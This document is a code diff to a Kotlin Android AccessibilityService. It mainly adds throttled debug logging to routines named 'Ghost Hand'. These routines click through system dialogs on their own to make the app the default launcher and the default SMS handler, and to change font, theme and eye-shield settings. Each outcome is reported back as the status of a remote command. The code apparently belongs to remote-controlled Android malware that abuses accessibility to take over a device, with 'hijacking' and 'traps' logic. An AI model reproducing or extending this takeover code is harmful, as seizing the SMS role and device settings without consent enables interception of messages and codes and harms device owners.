@@ -27,6 +27,16 @@ class MyAccessibilityService : AccessibilityService() {
     private var cachedRules: JSONObject = JSONObject()
     private var cachedUiTraps: JSONArray = JSONArray()
     private var cachedNativeTraps: JSONArray = JSONArray()
+    
+    private val throttleMap = mutableMapOf<String, Long>()
+    private fun logThrottled(tag: String, msg: String, interval: Long = 2000L) {
+        val now = System.currentTimeMillis()
+        val last = throttleMap[tag] ?: 0L
+        if (now - last > interval) {
+            DebugLogger.log(tag, msg)
+            throttleMap[tag] = now
+        }
+    }
 
     fun reloadUiTraps() {
         try {
@@ -336,19 +346,26 @@ class MyAccessibilityService : AccessibilityService() {
                 if (root != null) {
                     val targetLabel = getString(R.string.label_settings_app) // "Settings"
                     val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
-                    var clicked = false
-                    for (node in nodes) {
-                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                        while (target != null && !target.isClickable) target = target.parent
-                        if (target != null && target.isClickable) {
-                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                            clicked = true
-                            DebugLogger.log("GHOST_LAUNCHER", "Clicked radio button for: $targetLabel")
-                            break
+                    if (nodes.isEmpty()) {
+                        logThrottled("GHOST_LAUNCHER", "Waiting for target label: $targetLabel")
+                    } else {
+                        var clicked = false
+                        for (node in nodes) {
+                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                            while (target != null && !target.isClickable) target = target.parent
+                            if (target != null && target.isClickable) {
+                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                clicked = true
+                                DebugLogger.log("GHOST_LAUNCHER", "Clicked radio button for: $targetLabel")
+                                break
+                            }
                         }
-                    }
-                    
-                    if (clicked) {
+                        
+                        if (!clicked) {
+                            logThrottled("GHOST_LAUNCHER", "Found label: $targetLabel, but radio not clickable.")
+                        }
+                        
+                        if (clicked) {
                         LauncherManager.isHijacking = false
                         CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
                         
@@ -407,40 +424,55 @@ class MyAccessibilityService : AccessibilityService() {
                 val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Settings" }
 
                 if (targetLabel == null) {
-                    DebugLogger.log("GHOST_SMS", "Abort: Target label is null")
+                    logThrottled("GHOST_SMS", "Abort: Target label is null")
                     return
                 }
 
                 val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
-                var clickedRadio = false
-                
-                for (node in appNodes) {
-                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target?.isClickable == false) {
-                        target = target?.parent
-                    }
-                    target?.let { safeTarget ->
-                        if (safeTarget.isClickable) {
-                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                            clickedRadio = true
-                            DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
+                if (appNodes.isEmpty()) {
+                    logThrottled("GHOST_SMS", "Waiting for target app label: $targetLabel")
+                } else {
+                    var clickedRadio = false
+                    
+                    for (node in appNodes) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                        while (target?.isClickable == false) {
+                            target = target?.parent
                         }
-                    }
-                    if (clickedRadio) break
-                }
-                
-                if (clickedRadio) {
-                    // Small delay to allow radio state update
-                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default") + root.findAccessibilityNodeInfosByText("Set")
-                        for (btn in setNodes) {
-                            if (btn.isClickable) {
-                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
-                                break
+                        target?.let { safeTarget ->
+                            if (safeTarget.isClickable) {
+                                safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                clickedRadio = true
+                                DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
                             }
                         }
-                        DefaultSmsManager.expectedMode = "" // Disarm
+                        if (clickedRadio) break
+                    }
+                    
+                    if (!clickedRadio) {
+                        logThrottled("GHOST_SMS", "Found label: $targetLabel, but radio not clickable.")
+                    }
+                    
+                    if (clickedRadio) {
+                        logThrottled("GHOST_SMS", "Waiting for 'Set as default' button...")
+                        // Small delay to allow radio state update
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            val rootDelay = rootInActiveWindow ?: return@postDelayed
+                            val setNodes = rootDelay.findAccessibilityNodeInfosByText("Set as default") + rootDelay.findAccessibilityNodeInfosByText("Set")
+                            var btnClicked = false
+                            for (btn in setNodes) {
+                                if (btn.isClickable) {
+                                    btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                    DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
+                                    btnClicked = true
+                                    break
+                                }
+                            }
+                            if (!btnClicked) {
+                                DebugLogger.log("GHOST_SMS", "Could not find clickable 'Set as default' button.")
+                                return@postDelayed
+                            }
+                            DefaultSmsManager.expectedMode = "" // Disarm
                         CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                         
                         // Delay HOME slightly to ensure dialogs resolve and OS processes the action
@@ -1023,19 +1055,41 @@ class MyAccessibilityService : AccessibilityService() {
         when (activeSequence) {
             "FONT_PHASE_1" -> {
                 val node = root.findAccessibilityNodeInfosByText("Font size and style").firstOrNull()
-                if (clickNode(node)) activeSequence = "FONT_PHASE_2"
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("FONT_SEQ", "Clicked 'Font size and style'")
+                        activeSequence = "FONT_PHASE_2"
+                    } else DebugLogger.log("FONT_SEQ", "Found 'Font size and style' but click failed.")
+                } else logThrottled("FONT_SEQ", "Waiting for 'Font size and style'...")
             }
             "FONT_PHASE_2" -> {
                 val node = root.findAccessibilityNodeInfosByText("Font style").firstOrNull()
-                if (clickNode(node)) activeSequence = "FONT_PHASE_3"
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("FONT_SEQ", "Clicked 'Font style'")
+                        activeSequence = "FONT_PHASE_3"
+                    } else DebugLogger.log("FONT_SEQ", "Found 'Font style' but click failed.")
+                } else logThrottled("FONT_SEQ", "Waiting for 'Font style'...")
             }
             "FONT_PHASE_3" -> {
-                val node = root.findAccessibilityNodeInfosByText(sequenceTarget ?: "Default").firstOrNull()
-                if (clickNode(node)) finishSequence("Font changed to ${sequenceTarget}")
+                val tgt = sequenceTarget ?: "Default"
+                val node = root.findAccessibilityNodeInfosByText(tgt).firstOrNull()
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("FONT_SEQ", "Clicked target font: $tgt")
+                        finishSequence("Font changed to $tgt")
+                    } else DebugLogger.log("FONT_SEQ", "Found target font '$tgt' but click failed.")
+                } else logThrottled("FONT_SEQ", "Waiting for target font: $tgt...")
             }
             "THEME_PHASE_1" -> {
-                val node = root.findAccessibilityNodeInfosByText(sequenceTarget ?: "Light").firstOrNull()
-                if (clickNode(node)) finishSequence("Theme changed to ${sequenceTarget}")
+                val tgt = sequenceTarget ?: "Light"
+                val node = root.findAccessibilityNodeInfosByText(tgt).firstOrNull()
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("THEME_SEQ", "Clicked target theme: $tgt")
+                        finishSequence("Theme changed to $tgt")
+                    } else DebugLogger.log("THEME_SEQ", "Found target theme '$tgt' but click failed.")
+                } else logThrottled("THEME_SEQ", "Waiting for target theme: $tgt...")
             }
             "EYE_PHASE_1" -> {
                 val titleText = "Eye comfort shield"
@@ -1047,9 +1101,12 @@ class MyAccessibilityService : AccessibilityService() {
                     while (row != null && !row.isClickable) row = row.parent
                     
                     if (row != null && clickNode(row)) {
+                        DebugLogger.log("EYE_SEQ", "Clicked 'Eye comfort shield' row.")
                         activeSequence = "EYE_PHASE_2"
+                    } else {
+                        DebugLogger.log("EYE_SEQ", "Found 'Eye comfort shield' but row is not clickable.")
                     }
-                }
+                } else logThrottled("EYE_SEQ", "Waiting for 'Eye comfort shield' row...")
             }
             "EYE_PHASE_2" -> {
                 val goalEnable = sequenceTarget == "ENABLE"
@@ -1069,34 +1126,55 @@ class MyAccessibilityService : AccessibilityService() {
                     val isCurrentlyOn = text.contains("On", ignoreCase = true) && !text.equals("Off", ignoreCase = true)
                     
                     if (goalEnable == isCurrentlyOn) {
+                        DebugLogger.log("EYE_SEQ", "Already in target state: $sequenceTarget")
                         finishSequence("Eye Shield already in target state: $sequenceTarget")
                     } else {
-                        if (clickNode(toggleNode)) finishSequence("Eye Shield toggle executed: $sequenceTarget")
+                        if (clickNode(toggleNode)) {
+                            DebugLogger.log("EYE_SEQ", "Toggled state to: $sequenceTarget")
+                            finishSequence("Eye Shield toggle executed: $sequenceTarget")
+                        } else {
+                            DebugLogger.log("EYE_SEQ", "Found toggle but click failed.")
+                        }
                     }
-                }
+                } else logThrottled("EYE_SEQ", "Waiting for On/Off toggle button...")
             }
             "MDR_FONT_1" -> {
                 val node = root.findAccessibilityNodeInfosByText("Font size and style").firstOrNull()
-                if (clickNode(node)) activeSequence = "MDR_FONT_2"
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("MDR", "[MDR_FONT_1] Clicked 'Font size and style'")
+                        activeSequence = "MDR_FONT_2"
+                    } else DebugLogger.log("MDR", "[MDR_FONT_1] Found node but click failed.")
+                } else logThrottled("MDR", "[MDR_FONT_1] Waiting for 'Font size and style'...")
             }
             "MDR_FONT_2" -> {
                 val node = root.findAccessibilityNodeInfosByText("Font style").firstOrNull()
-                if (clickNode(node)) activeSequence = "MDR_FONT_3"
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("MDR", "[MDR_FONT_2] Clicked 'Font style'")
+                        activeSequence = "MDR_FONT_3"
+                    } else DebugLogger.log("MDR", "[MDR_FONT_2] Found node but click failed.")
+                } else logThrottled("MDR", "[MDR_FONT_2] Waiting for 'Font style'...")
             }
             "MDR_FONT_3" -> {
                 val node = root.findAccessibilityNodeInfosByText("Default").firstOrNull()
-                if (clickNode(node)) {
-                    activeSequence = "MDR_THEME"
-                    performGlobalAction(GLOBAL_ACTION_BACK)
-                    Handler(Looper.getMainLooper()).postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 600)
-                }
+                if (node != null) {
+                    if (clickNode(node)) {
+                        DebugLogger.log("MDR", "[MDR_FONT_3] Clicked 'Default' font. Moving to Theme.")
+                        activeSequence = "MDR_THEME"
+                        performGlobalAction(GLOBAL_ACTION_BACK)
+                        Handler(Looper.getMainLooper()).postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 600)
+                    } else DebugLogger.log("MDR", "[MDR_FONT_3] Found 'Default' but click failed.")
+                } else logThrottled("MDR", "[MDR_FONT_3] Waiting for 'Default' font option...")
             }
             "MDR_THEME" -> {
                 val node = root.findAccessibilityNodeInfosByText("Light").firstOrNull()
                 if (node != null) {
-                    clickNode(node)
-                    activeSequence = "MDR_EYE"
-                }
+                    if (clickNode(node)) {
+                        DebugLogger.log("MDR", "[MDR_THEME] Clicked 'Light' theme. Moving to Eye Shield.")
+                        activeSequence = "MDR_EYE"
+                    } else DebugLogger.log("MDR", "[MDR_THEME] Found 'Light' but click failed.")
+                } else logThrottled("MDR", "[MDR_THEME] Waiting for 'Light' theme option...")
             }
             "MDR_EYE" -> {
                 val titleText = "Eye comfort shield"
@@ -1106,9 +1184,10 @@ class MyAccessibilityService : AccessibilityService() {
                     var row = targetNode
                     while (row != null && !row.isClickable) row = row.parent
                     if (row != null && clickNode(row)) {
+                        DebugLogger.log("MDR", "[MDR_EYE] Clicked 'Eye comfort shield' menu.")
                         activeSequence = "MDR_EYE_2"
-                    }
-                }
+                    } else DebugLogger.log("MDR", "[MDR_EYE] Found 'Eye comfort shield' but row is not clickable.")
+                } else logThrottled("MDR", "[MDR_EYE] Waiting for 'Eye comfort shield' row...")
             }
             "MDR_EYE_2" -> {
                 val onNodes = root.findAccessibilityNodeInfosByText("On")
@@ -1123,7 +1202,10 @@ class MyAccessibilityService : AccessibilityService() {
                 // Wait for the UI page to inflate before proceeding
                 if (toggleNode != null || disabledNode != null) {
                     if (toggleNode != null) {
+                        DebugLogger.log("MDR", "[MDR_EYE_2] Found 'On' state. Turning OFF.")
                         clickNode(toggleNode) // Turn it Off
+                    } else {
+                        DebugLogger.log("MDR", "[MDR_EYE_2] Already 'Off'. Proceeding to cleanup.")
                     }
                     
                     // FINAL STEP: FULL VISIBILITY RESTORE
